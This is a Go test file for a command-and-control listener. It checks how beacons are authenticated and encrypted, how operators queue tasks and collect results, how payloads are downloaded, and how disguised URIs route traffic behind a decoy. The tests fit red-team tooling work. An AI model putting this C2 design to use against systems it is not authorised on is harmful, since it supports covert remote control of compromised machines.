package main

import (
	"bytes"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"io"
	"log"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
	"time"
)

// ── Python parity: key derivation ───────────────────────────────────────
// Vectors produced by phantom.utils.c2_crypto._derive_to_length. A drift here
// means the Go listener cannot decrypt a single beacon.

func TestDeriveToLengthParity(t *testing.T) {
	cases := []struct {
		raw  string
		want string
	}{
		{"deadbeefdeadbeefdeadbeefdeadbeef",
			"6465616462656566646561646265656664656164626565666465616462656566"},
		{"0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
			"0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"},
		{base64.RawStdEncoding.EncodeToString(bytes.Repeat([]byte("K"), 32)),
			"4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b"},
		{"shorty",
			"07672b212369f416dc3505dcba04f379ff39de0d0db31536e57dae76486b5000"},
	}
	for _, c := range cases {
		got := hex.EncodeToString(deriveToLength([]byte(c.raw), 32))
		if got != c.want {
			t.Errorf("deriveToLength(%q) = %s, want %s", c.raw, got, c.want)
		}
	}
}

// ── Python parity: HMAC canonical string ────────────────────────────────

func TestSignParityWithPython(t *testing.T) {
	secret := make([]byte, 32)
	for i := range secret {
		secret[i] = byte(i)
	}
	if got := Sign(secret, "GET", "/api/v1/ping", "1759000000", "7",
		"abc123", ""); got != "fd9d0747fe8d1210778af9460e598447eb10cc13d43ec6d0d49e84466673ab4d" {
		t.Errorf("empty-body signature mismatch: %s", got)
	}
	if got := Sign(secret, "POST", "/x.js", "1759000042", "19", "n0nce",
		"Y2lwaGVy"); got != "44f31f3cc0e878a0d31e985875e742db20ae2ea5f3e9042926334e69b849e955" {
		t.Errorf("body signature mismatch: %s", got)
	}
	// method is upper-cased before signing
	if Sign(secret, "get", "/api/v1/ping", "1759000000", "7", "abc123", "") !=
		Sign(secret, "GET", "/api/v1/ping", "1759000000", "7", "abc123", "") {
		t.Error("method must be upper-cased in the canonical string")
	}
}

func TestVerifyRejectsStaleAndTampered(t *testing.T) {
	secret := bytes.Repeat([]byte{9}, 32)
	now := int64(1759000000)
	sig := Sign(secret, "GET", "/api/v1/ping", "1759000000", "7", "abc", "")
	if !Verify(secret, "GET", "/api/v1/ping", "1759000000", "7", "abc", sig, "", now, 120) {
		t.Fatal("a fresh, correct request must verify")
	}
	if Verify(secret, "GET", "/api/v1/ping", "1759000000", "7", "abc", sig, "", now+121, 120) {
		t.Error("a request outside the skew window must be rejected")
	}
	bad := "0" + sig[1:]
	if bad == sig {
		bad = "1" + sig[1:]
	}
	if Verify(secret, "GET", "/api/v1/ping", "1759000000", "7", "abc",
		bad, "", now, 120) {
		t.Error("a tampered signature must be rejected")
	}
	// Parity with the Python verifier, which lower-cases the provided hex
	// before the constant-time compare: an upper-case signature is accepted.
	if !Verify(secret, "GET", "/api/v1/ping", "1759000000", "7", "abc",
		strings.ToUpper(sig), "", now, 120) {
		t.Error("upper-case hex must verify (parity with Python)")
	}
	if Verify(secret, "GET", "/api/v1/other", "1759000000", "7", "abc", sig, "", now, 120) {
		t.Error("a signature bound to another path must be rejected")
	}
	if Verify(secret, "GET", "/api/v1/ping", "-1", "7", "abc", sig, "", now, 120) {
		t.Error("a negative counter must be rejected")
	}
}

func TestReplayGuardRejectsReuseAndStaleEpoch(t *testing.T) {
	g := NewReplayGuard()
	if err := g.Check("B-1", "n1", 1); err != nil {
		t.Fatalf("first use should pass: %v", err)
	}
	if err := g.Check("B-1", "n1", 2); err == nil {
		t.Error("reusing a nonce must be rejected")
	}
	if err := g.Check("B-2", "n1", 1); err != nil {
		t.Errorf("the nonce space is per beacon: %v", err)
	}
	// a restart rotates the epoch: a nonce from the old one is a replay
	next := &ReplayGuard{epoch: "different", byNode: map[string]*nonceState{
		"B-1": {set: map[string]bool{}, epoch: map[string]string{}},
	}, counter: map[string]int64{}}
	if err := next.Check("B-1", "n2", 1); err != nil {
		t.Fatalf("fresh guard: %v", err)
	}
	g.mu.Lock()
	g.byNode["B-1"].epoch["n2"] = "old-epoch"
	g.mu.Unlock()
	if err := g.Check("B-1", "n2", 3); err == nil {
		t.Error("a nonce first seen under another epoch must be rejected")
	}
}

// ── envelope ───────────────────────────────────────────────────────────

func TestEnvelopeRoundTripAndTamper(t *testing.T) {
	key := bytes.Repeat([]byte{7}, 32)
	enc, err := Encrypt(key, "hello beacon")
	if err != nil {
		t.Fatal(err)
	}
	raw, _ := base64.StdEncoding.DecodeString(enc)
	if len(raw) < nonceLen+tagLen {
		t.Fatalf("envelope too short: %d", len(raw))
	}
	dec, err := Decrypt(key, enc)
	if err != nil || dec != "hello beacon" {
		t.Fatalf("round trip failed: %q %v", dec, err)
	}
	// flip one ciphertext byte: GCM must refuse it
	raw[len(raw)-1] ^= 0x01
	if _, err := Decrypt(key, base64.StdEncoding.EncodeToString(raw)); err == nil {
		t.Error("a tampered ciphertext must not decrypt")
	}
	if _, err := Decrypt(key, "AAAA"); err == nil {
		t.Error("a body shorter than nonce+tag must be refused")
	}
}

// ── end-to-end over httptest ───────────────────────────────────────────

type harness struct {
	t     *testing.T
	srv   *httptest.Server
	store *Store
	cfg   *Config
	key   []byte
	sec   []byte
	// envKey is the PER-BEACON envelope key the listener seals responses
	// with: deriving it the same way the beacon does is the whole point.
	envKey []byte
}

func newHarness(t *testing.T) *harness {
	t.Helper()
	dir := t.TempDir()
	secret := bytes.Repeat([]byte{0x2a}, 32)
	registry := filepath.Join(dir, "beacon_registry.json")
	reg := map[string]any{
		"version": 1,
		"beacons": map[string]any{
			"B-TEST": map[string]any{
				"status": "active",
				"secret": base64.RawURLEncoding.EncodeToString(secret),
			},
		},
	}
	raw, _ := json.Marshal(reg)
	if err := os.WriteFile(registry, raw, 0o600); err != nil {
		t.Fatal(err)
	}
	key := bytes.Repeat([]byte{0x11}, 32)
	// Bind is the PRODUCTION default (0.0.0.0): the fail-closed tolerance for
	// unenrolled identities applies only to a loopback bind.
	cfg := &Config{
		Bind: "0.0.0.0", Port: 0, SSL: false, MTLS: false,
		AESKey: key, APIToken: "api-token", PayloadToken: "pay-token",
		BeaconRegistry: registry, PayloadDir: dir, DataDir: dir,
	}
	store := NewStore(registry)
	srv := httptest.NewServer(NewServer(cfg, store, log.New(io.Discard, "", 0)).Handler())
	t.Cleanup(srv.Close)
	return &harness{t: t, srv: srv, store: store, cfg: cfg, key: key,
		sec: secret, envKey: EnvelopeKey(secret, "B-TEST")}
}

func (h *harness) signed(method, path, body, nonce string, counter int64) *http.Request {
	h.t.Helper()
	ts := time.Now().Unix()
	sig := Sign(h.sec, method, path, strconv.FormatInt(ts, 10),
		strconv.FormatInt(counter, 10), nonce, body)
	req, err := http.NewRequest(method, h.srv.URL+path, strings.NewReader(body))
	if err != nil {
		h.t.Fatal(err)
	}
	req.Header.Set("X-Beacon-Id", "B-TEST")
	req.Header.Set("X-Beacon-Timestamp", strconv.FormatInt(ts, 10))
	req.Header.Set("X-Beacon-Counter", strconv.FormatInt(counter, 10))
	req.Header.Set("X-Beacon-Nonce", nonce)
	req.Header.Set("X-Beacon-Auth", sig)
	return req
}

func (h *harness) do(req *http.Request) *http.Response {
	h.t.Helper()
	resp, err := h.srv.Client().Do(req)
	if err != nil {
		h.t.Fatal(err)
	}
	return resp
}

func TestCheckinQueueResultRoundTrip(t *testing.T) {
	h := newHarness(t)

	// 1) first check-in: authenticated, no tasks, encrypted response
	resp := h.do(h.signed("POST", "/api/v1/ping", "", "n1", 1))
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		t.Fatalf("checkin = %d", resp.StatusCode)
	}
	body, _ := io.ReadAll(resp.Body)
	plain, err := Decrypt(h.envKey, string(body))
	if err != nil {
		t.Fatalf("response must be an encrypted envelope: %v", err)
	}
	var checkin struct {
		Tasks []map[string]any `json:"tasks"`
	}
	if err := json.Unmarshal([]byte(plain), &checkin); err != nil || len(checkin.Tasks) != 0 {
		t.Fatalf("expected an empty task list, got %q (%v)", plain, err)
	}

	// 2) operator queues a task
	qreq, _ := http.NewRequest("POST", h.srv.URL+"/api/v1/queue",
		strings.NewReader(`{"beacon_id":"B-TEST","command":"whoami"}`))
	qreq.Header.Set("X-Api-Token", "api-token")
	qresp := h.do(qreq)
	defer qresp.Body.Close()
	if qresp.StatusCode != 200 {
		t.Fatalf("queue = %d", qresp.StatusCode)
	}

	// 3) next check-in leases it
	resp2 := h.do(h.signed("POST", "/api/v1/ping", "", "n2", 2))
	defer resp2.Body.Close()
	body2, _ := io.ReadAll(resp2.Body)
	plain2, _ := Decrypt(h.envKey, string(body2))
	if !strings.Contains(plain2, "whoami") {
		t.Fatalf("the leased task must be delivered: %q", plain2)
	}
	var leased struct {
		Tasks []struct {
			TaskID  string `json:"task_id"`
			Command string `json:"command"`
		} `json:"tasks"`
	}
	_ = json.Unmarshal([]byte(plain2), &leased)
	if len(leased.Tasks) != 1 {
		t.Fatalf("expected exactly one task, got %d", len(leased.Tasks))
	}
	taskID := leased.Tasks[0].TaskID

	// 4) the active lease withholds redelivery
	resp3 := h.do(h.signed("POST", "/api/v1/ping", "", "n3", 3))
	defer resp3.Body.Close()
	body3, _ := io.ReadAll(resp3.Body)
	plain3, _ := Decrypt(h.envKey, string(body3))
	if strings.Contains(plain3, "whoami") {
		t.Error("a leased task must not be redelivered inside the lease window")
	}

	// 5) the beacon posts the result
	resultJSON, _ := json.Marshal(map[string]string{
		"task_id": taskID, "output": "nt authority\\system"})
	enc, _ := Encrypt(h.envKey, string(resultJSON))
	rresp := h.do(h.signed("POST", "/api/v1/result", enc, "n4", 4))
	defer rresp.Body.Close()
	if rresp.StatusCode != 200 {
		t.Fatalf("result = %d", rresp.StatusCode)
	}

	// 6) operator reads it back, and a duplicate result is ignored
	ggreq, _ := http.NewRequest("GET",
		h.srv.URL+"/api/v1/results?beacon_id=B-TEST", nil)
	ggreq.Header.Set("X-Api-Token", "api-token")
	gresp := h.do(ggreq)
	defer gresp.Body.Close()
	gbody, _ := io.ReadAll(gresp.Body)
	if !strings.Contains(string(gbody), "nt authority") {
		t.Fatalf("result not stored: %s", gbody)
	}
	dupe := h.do(h.signed("POST", "/api/v1/result", enc, "n5", 5))
	defer dupe.Body.Close()
	gresp2 := h.do(ggreq.Clone(ggreq.Context()))
	defer gresp2.Body.Close()
	gbody2, _ := io.ReadAll(gresp2.Body)
	if strings.Count(string(gbody2), "nt authority") != 1 {
		t.Errorf("a duplicate result must be idempotent: %s", gbody2)
	}
}

// The vectors on both sides come from ONE Python run. If the beacon, the
// Python control plane and c2d ever disagree on the KDF the failure is silent
// (traffic simply never decrypts), so pin it here AND in
// tests/test_c2_crypto_keys.py.
func TestEnvelopeKeyDerivationVectors(t *testing.T) {
	secret := make([]byte, 32)
	for i := range secret {
		secret[i] = byte(i)
	}
	cases := []struct {
		name     string
		beaconID string
		want     string
	}{
		{"named identity", "B-TEST",
			"275c2265389eb7081752b239a2ab65fab82938b05e579d7937ded40bc33b5afc"},
		{"empty identity", "",
			"88170beeb2e2a92e1c5875050d69741b6d7384ed20e930ceaa366d2fa50ba182"},
		{"utf8 identity", "B-\u00e8-t\u00e9st",
			"7c6eb272b1b1478f38248badb802e48e71c5af45b8a74b6c68aa67aeff7b337e"},
	}
	for _, c := range cases {
		got := hex.EncodeToString(EnvelopeKey(secret, c.beaconID))
		if got != c.want {
			t.Errorf("%s: envelope key = %s, want %s", c.name, got, c.want)
		}
	}
	if got := DownloadToken(secret, "B-TEST"); got != "f8a955bf74dc5a93aa0407d58429898600aade9123bb3b23f5bb38dadcb608d6" {
		t.Errorf("download token = %s", got)
	}
	if DownloadToken(nil, "B-TEST") != "" {
		t.Error("an identity with no secret must not produce a token")
	}
	// Domain separation: download and envelope must not be the same key.
	if bytes.Equal(EnvelopeKey(secret, "B-TEST"),
		[]byte(DownloadToken(secret, "B-TEST"))) {
		t.Error("envelope key and download token must be independent keys")
	}
}

// A beacon built BEFORE per-beacon derivation still speaks the deployment
// key, and must keep working without a rebuild.
func TestLegacyDeploymentKeyStillAccepted(t *testing.T) {
	h := newHarness(t)

	legacy := `{"sysinfo": "OS: Linux\\nUser: root", "netinfo": ""}`
	enc, _ := Encrypt(h.key, legacy)
	resp := h.do(h.signed("POST", "/api/v1/ping", enc, "legacy-1", 1))
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		t.Fatalf("legacy check-in = %d", resp.StatusCode)
	}
	body, _ := io.ReadAll(resp.Body)
	// The RESPONSE is sealed per-beacon: the beacon derives the same key, so
	// this is the correct key for a modern binary and a harmless upgrade for
	// an old one only after it is rebuilt.
	plain, err := Decrypt(h.envKey, string(body))
	if err != nil {
		t.Fatalf("response must use the per-beacon key: %v", err)
	}
	if !strings.Contains(plain, "tasks") {
		t.Fatalf("unexpected response: %q", plain)
	}
}

// The per-beacon download token authorises a payload fetch for THAT identity
// only — the deployment token is no longer burned into a fresh build.
func TestPerBeaconPayloadToken(t *testing.T) {
	h := newHarness(t)
	req := mustReq(t, "GET", h.srv.URL+"/api/v1/payload")
	req.Header.Set("X-Beacon-Id", "B-TEST")
	req.Header.Set("X-Auth-Token", DownloadToken(h.sec, "B-TEST"))
	resp := h.do(req)
	defer resp.Body.Close()
	if resp.StatusCode != 404 {
		t.Errorf("per-beacon token must be accepted (404 = file missing), got %d",
			resp.StatusCode)
	}

	// Same identity, another identity's token -> refused.
	other := make([]byte, 32)
	for i := range other {
		other[i] = 0x7f
	}
	bad := mustReq(t, "GET", h.srv.URL+"/api/v1/payload")
	bad.Header.Set("X-Beacon-Id", "B-TEST")
	bad.Header.Set("X-Auth-Token", DownloadToken(other, "B-TEST"))
	badresp := h.do(bad)
	defer badresp.Body.Close()
	if badresp.StatusCode != 403 {
		t.Errorf("a foreign download token must be 403, got %d", badresp.StatusCode)
	}

	// No identity at all: the derived path cannot apply.
	anon := mustReq(t, "GET", h.srv.URL+"/api/v1/payload")
	anon.Header.Set("X-Auth-Token", DownloadToken(h.sec, "B-TEST"))
	anonresp := h.do(anon)
	defer anonresp.Body.Close()
	if anonresp.StatusCode != 403 {
		t.Errorf("a per-beacon token without X-Beacon-Id must be 403, got %d",
			anonresp.StatusCode)
	}
}

func TestUnauthenticatedAndReplayAreRejected(t *testing.T) {
	h := newHarness(t)

	// unknown identity, non-loopback default bind -> refuse (fail closed)
	req, _ := http.NewRequest("POST", h.srv.URL+"/api/v1/ping", nil)
	req.Header.Set("X-Beacon-Id", "B-UNKNOWN")
	resp := h.do(req)
	defer resp.Body.Close()
	if resp.StatusCode != 401 {
		t.Errorf("unregistered beacon on a non-loopback bind must be 401, got %d",
			resp.StatusCode)
	}

	// a valid request, then the SAME nonce replayed
	first := h.do(h.signed("POST", "/api/v1/ping", "", "same-nonce", 10))
	defer first.Body.Close()
	if first.StatusCode != 200 {
		t.Fatalf("first = %d", first.StatusCode)
	}
	second := h.do(h.signed("POST", "/api/v1/ping", "", "same-nonce", 11))
	defer second.Body.Close()
	if second.StatusCode != 401 {
		t.Errorf("a replayed nonce must be 401, got %d", second.StatusCode)
	}
}

func TestOperatorTokenIsRequired(t *testing.T) {
	h := newHarness(t)
	req, _ := http.NewRequest("GET", h.srv.URL+"/api/v1/beacons", nil)
	resp := h.do(req)
	defer resp.Body.Close()
	if resp.StatusCode != 403 {
		t.Errorf("operator endpoint without the token must be 403, got %d",
			resp.StatusCode)
	}
}

func TestMalleableCatchAllRouting(t *testing.T) {
	h := newHarness(t)

	// rotated, random-cased URI WITH a beacon id -> check-in, not a 404
	resp := h.do(h.signed("GET", "/AsSeTs/A1b2/StYle.css", "", "c1", 1))
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		t.Fatalf("a rotated URI must route by content, got %d", resp.StatusCode)
	}

	// an unmatched /api/* WITHOUT a beacon id is an operator mistake -> 404
	bad, _ := http.NewRequest("GET", h.srv.URL+"/api/v1/typo", nil)
	badresp := h.do(bad)
	defer badresp.Body.Close()
	if badresp.StatusCode != 404 {
		t.Errorf("unknown /api/* must be 404, got %d", badresp.StatusCode)
	}

	// a benign decoy for anything else
	decoy, _ := http.NewRequest("GET", h.srv.URL+"/latest/feed.json", nil)
	dresp := h.do(decoy)
	defer dresp.Body.Close()
	body, _ := io.ReadAll(dresp.Body)
	if dresp.StatusCode != 200 || string(body) != "C2 OK" {
		t.Errorf("non-beacon path should be a benign decoy, got %d %q",
			dresp.StatusCode, body)
	}
}

func TestPayloadTokenGuardsDownloads(t *testing.T) {
	h := newHarness(t)
	// no token -> 403
	resp := h.do(mustReq(t, "GET", h.srv.URL+"/api/v1/payload"))
	defer resp.Body.Close()
	if resp.StatusCode != 403 {
		t.Errorf("payload without token must be 403, got %d", resp.StatusCode)
	}
	// with the token, a missing file is an honest 404 (not a silent 200)
	req := mustReq(t, "GET", h.srv.URL+"/api/v1/payload")
	req.Header.Set("X-Auth-Token", "pay-token")
	resp2 := h.do(req)
	defer resp2.Body.Close()
	if resp2.StatusCode != 404 {
		t.Errorf("unbuilt payload must be 404, got %d", resp2.StatusCode)
	}
}

func mustReq(t *testing.T, method, url string) *http.Request {
	t.Helper()
	req, err := http.NewRequest(method, url, nil)
	if err != nil {
		t.Fatal(err)
	}
	return req
}
